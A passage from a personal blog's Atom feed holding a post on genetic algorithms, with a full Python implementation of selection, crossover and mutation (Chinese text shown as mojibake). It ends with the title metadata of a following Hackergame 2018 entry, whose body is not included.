comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover äº¤å‰</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation å˜å¼‚</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡å¹³å‡å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡æœ€å°å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡æœ€å¤§å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><p>é—ä¼ ç®—æ³•å®ä¾‹è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018180316.png" alt=""></p><blockquote><p>ç°åœ¨å¯¹é—ä¼ ç®—æ³•ä¹Ÿå¤§æ¦‚æœ‰ä¸ªç®€å•çš„äº†è§£å•¦ï¼Œæš‚æ—¶åˆ°è¿™å„¿ã€‚</p></blockquote><p>é™„ä¸Šå®Œæ•´ä»£ç ï¼š<a href="https://github.com/Yof3ng/algorithm/blob/master/SGA.py" target="_blank" rel="noopener">https://github.com/Yof3ng/algorithm/blob/master/SGA.py</a></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">def</span> <span class="token function">FuncMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    xx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>    yy<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#é€šè¿‡å¾ªç¯è®¡ç®—æ¯ä¸€ä¸ªxå€¼å¯¹åº”çš„yå€¼</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> xx<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">)</span>        yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">return</span> max<span class="token punctuation">(</span>yy<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ ¹æ®å‡½æ•°åŸå‹è®¡ç®—è¡¨ç°å‹ï¼ˆyå€¼)ï¼Œå³é€‚åº”åº¦</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#é€šè¿‡å¾ªç¯è®¡ç®—æ¯ä¸€ä¸ªxå€¼å¯¹åº”çš„yå€¼</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#ç”±äºæ˜¯è®¡ç®—æœ€å¤§å€¼ï¼Œè‹¥å­˜åœ¨æ­£æ•°åˆ™ç›´æ¥å»é™¤è´Ÿæ•°ä¸ªä½“</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population<span class="token comment" spellcheck="true">#è§£ç </span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#print(population)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#å°†äºŒè¿›åˆ¶è½¬æ¢ä¸ºæ•´å‹æ•°å€¼</span>        x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>        Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>        <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>    <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation    <span class="token comment" spellcheck="true">#return express</span>    <span class="token comment" spellcheck="true"># print(bx[0:100])</span>    <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span><span class="token comment" spellcheck="true">#åˆå§‹åŒ–ä¸ªä½“</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population<span class="token comment" spellcheck="true">#å®šä¹‰ç‰©ç«å¤©æ‹©,å¼±è€…æ·˜æ±°</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#è½®ç›˜èµŒé€‰æ‹©,æŸ“è‰²ä½“ç´¯è®¡æ¦‚ç‡</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#è¿›è¡Œé€‰æ‹©ï¼Œæ·˜æ±°å¼±è€…ï¼Œè·å–æ–°ç§ç¾¤</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ç•™ä¸‹ä¼˜ç§€ä¸ªä½“</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span><span class="token comment" spellcheck="true">#äº¤å‰ç®—å­</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring<span class="token comment" spellcheck="true">#å˜å¼‚ç®—å­</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#é€šè¿‡matplotlibåº“ç»˜å‡ºå‡½æ•°å›¾å½¢</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover äº¤å‰</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation å˜å¼‚</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡å¹³å‡å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡æœ€å°å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡æœ€å¤§å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html</a></p><p><a href="https://blog.csdn.net/WFRainn/article/details/80458246" target="_blank" rel="noopener">https://blog.csdn.net/WFRainn/article/details/80458246</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;é—ä¼ ç®—æ³•ï¼ˆGenetic-Algorithmï¼‰&quot;&gt;&lt;a href=&quot;#é—ä¼ ç®—æ³•ï¼ˆGenetic-Algorithmï¼‰&quot; class=&quot;headerlink&quot; title=&quot;é—ä¼ ç®—æ³•ï¼ˆGenetic Algorithmï¼‰&quot;&gt;&lt;/a&gt;é—ä¼ ç®—æ³•
      
    
    </summary>
    
      <category term="ç®—æ³•" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
    
      <category term="ç®—æ³•" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="æ•°å­¦å»ºæ¨¡" scheme="http://www.yof3ng.xyz/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
      <category term="python" scheme="http://www.yof3ng.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>ustc-Hackergam2018</title>
    <link href="http://www.yof3ng.xyz/2018/10/16/ustc-Hackergam2018/"/>
    <id>http://www.yof3ng.xyz/2018/10/16/ustc-Hackergam2018/</id>
    <published>2018-10-16T04:31:21.000Z</published>
    <updated>2018-10-16T06:10:45.433Z</updated>
    
